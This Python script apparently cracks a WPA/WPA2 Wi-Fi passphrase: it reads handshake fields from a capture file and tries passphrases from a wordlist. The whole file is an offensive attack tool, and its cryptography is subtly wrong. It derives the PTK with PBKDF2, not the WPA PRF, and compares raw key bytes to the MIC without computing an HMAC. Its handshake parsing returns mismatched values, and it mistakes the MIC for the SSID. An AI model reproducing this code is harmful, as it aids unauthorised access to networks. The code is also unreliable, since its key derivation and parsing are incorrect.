from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon
from passlib.hash import pbkdf2_sha1
import hashlib
import binascii
import sys

# Function to extract WPA details from the pcap file
def extract_wpa_details(packet):
    if packet.haslayer(EAPOL):
        eapol = packet[EAPOL]
        if eapol.type == 3:  # EAPOL-Key (part of WPA handshake)
            key_mic = eapol.key_mic
            key_nonce = eapol.key_nonce
            ap_mac = packet[Dot11].addr2
            client_mac = packet[Dot11].addr1
            print(f"WPA Key MIC: {key_mic.hex()}")
            print(f"Key Nonce: {key_nonce.hex()}")
            print(f"AP MAC: {ap_mac}")
            print(f"Client MAC: {client_mac}")
            return key_mic, key_nonce, ap_mac, client_mac
    
    if packet.haslayer(Dot11Beacon):
        ssid = packet.info.decode()
        print(f"SSID: {ssid}")
        return ssid

    return None, None, None, None

# Function to generate PMK from the passphrase, SSID, and nonces
def generate_pmk(passphrase, ssid, ap_mac, client_mac):
    ssid_bytes = ssid.encode('utf-8')
    ap_mac_bytes = binascii.unhexlify(ap_mac.replace(":", ""))
    client_mac_bytes = binascii.unhexlify(client_mac.replace(":", ""))
    
    # Prepare the key material for PBKDF2
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode('utf-8'), ssid_bytes, 4096, 32)
    return pmk

# Function to perform a dictionary attack using PBKDF2-HMAC-SHA1
def dictionary_attack(wordlist, ssid, key_mic, key_nonce, ap_mac, client_mac):
    with open(wordlist, 'r') as file:
        for line in file:
            passphrase = line.strip()
            pmk = generate_pmk(passphrase, ssid, ap_mac, client_mac)
            
            # Generate PTK from PMK (For WPA/WPA2, the PTK is derived from PMK)
            ptk = hashlib.pbkdf2_hmac('sha1', pmk, key_nonce + ap_mac.encode('utf-8') + client_mac.encode('utf-8'), 4096, 64)

            # Calculate MIC and compare with the given key_mic
            ptk_mic = ptk[:16]  # MIC is the first 16 bytes of PTK
            if ptk_mic == key_mic:
                print(f"Found matching passphrase: {passphrase}")
                return passphrase

    print("Passphrase not found in wordlist.")
    return None

def main():
    pcap_file = "wpa.cap"
    wordlist_file = "pwd.txt"  # Wordlist for cracking

    packets = rdpcap(pcap_file)
    key_mic, key_nonce, ap_mac, client_mac, ssid = None, None, None, None, None

    # Extract WPA details
    for pkt in packets:
        key_mic, key_nonce, ap_mac, client_mac = extract_wpa_details(pkt)
        if key_mic and key_nonce and ap_mac and client_mac:
            ssid = extract_wpa_details(pkt)[0]  # SSID from Beacon
            break

    if key_mic and key_nonce and ssid:
        print(f"Starting dictionary attack on SSID: {ssid}")
        passphrase = dictionary_attack(wordlist_file, ssid, key_mic, key_nonce, ap_mac, client_mac)
        if passphrase:
            print(f"Passphrase found: {passphrase}")
        else:
            print("Passphrase not found.")

if __name__ == "__main__":
    main()
